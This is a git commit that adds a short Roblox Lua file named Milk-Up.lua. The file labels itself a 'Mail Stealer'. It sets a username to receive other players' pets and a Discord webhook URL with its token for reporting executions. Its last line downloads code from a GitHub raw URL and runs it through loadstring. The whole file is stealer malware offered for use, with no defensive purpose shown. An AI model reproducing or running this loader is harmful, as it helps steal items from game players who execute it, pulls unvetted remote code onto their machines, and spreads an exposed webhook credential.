cde6a0611eb36857a4c84b381c327cd785f89327
Plikujynm232 <129164402+Plikujynm232@users.noreply.github.com>
2023-06-17 19:00:31 +0700

    Update and rename README.md to Milk-Up.lua

---
+++ Milk-Up.lua
@@ -0,0 +1,9 @@
+--[[ Hostee Scriptz Mail Stealer ]]--
+
+--[[ Main Config ]]--
+_G.UserNamey = "Plum25532" --// Username To Send Pets To
+--[[ Webhook Config ]]--
+_G.Webhooky = "https://discord.com/api/webhooks/1114487614104424530/UQpe1bKD5qjDS8pUDMJqKV94Ucw6mdTY3V5LtRi3D5sN1J4YzGNC_Y0tjf-PKH1xtgnJ" --// Discord Webhook For Executions
+
+--[[ Script ]]
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20MailStealer%20%E2%9C%97"))()
